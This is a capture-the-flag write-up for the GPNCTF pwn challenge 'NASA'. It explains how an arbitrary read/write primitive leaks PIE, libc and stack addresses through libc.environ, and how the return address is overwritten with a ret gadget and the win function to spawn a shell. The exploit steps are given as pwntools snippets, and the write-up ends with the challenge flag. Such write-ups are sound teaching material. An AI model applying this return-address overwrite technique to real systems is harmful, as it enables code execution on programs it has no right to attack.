# NASA

## Challenge Summary

- **Category**: Pwn
- **Points**: 131
- **Solves**: 43 teams

---

### Problem Description

> Why even bother writing secure code when you can just enable sanitizers?

---

## Challenge Structure

- The program offers 3 options:\
  `[1] Write` — write 8 bytes to an arbitrary address\
  `[2] Read` — read 8 bytes from an arbitrary address\
  `[3] Exit` — exit the program
- `provide_help()` prints both a stack pointer and the `win` function address
- **Note**: Because of the enabled sanitizers (ASAN), the printed stack pointer does not match the real stack address where the return pointer is located. We ignore this leaked stack pointer and instead use `libc.environ` to leak the actual stack location.
- The goal is to calculate the PIE and libc base addresses, find the return address on the stack, and overwrite it to execute `win`

---

### Protections:

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    ASAN:       Enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

---

## Exploitation Flow

### Step 1: Determine PIE base

The program prints the address of `win`. We use this to compute the PIE base.

```python
r.recvline()  # skip stack pointer
win_addr = int(r.recvline().strip(), 16)
elf.address = win_addr - elf.sym.win
```

---

### Step 2: Leak libc base

We use the read primitive to leak the `stdin` address and compute the libc base.

```python
stdin_addr = read(r, elf.sym.stdin)
libc.address = stdin_addr - libc.sym._IO_2_1_stdin_
```

---

### Step 3: Leak stack address

By reading from `libc.environ`, we leak the current stack address.

```python
environ_addr = read(r, libc.sym.environ)
```

---

### Step 4: Overwrite return address

We calculate the return address location on the stack and overwrite it with a `ret` gadget followed by the `win` address.

```python
ret_addr = environ_addr - 0x130
write(r, ret_addr, ret_gadget)
write(r, ret_addr + 8, win_addr)
```

---

### Step 5: Trigger ROP chain

We exit the program to cause it to return and execute our ROP chain.

```python
exit(r)
r.interactive()
```

---

## Flag

After spawning a shell:

```
$ cat flag
GPNCTF{alL_wR1t3s_ar3_pROtEC73d_BY_A54n_0nly_1N_your_DR34ms_9438}
```
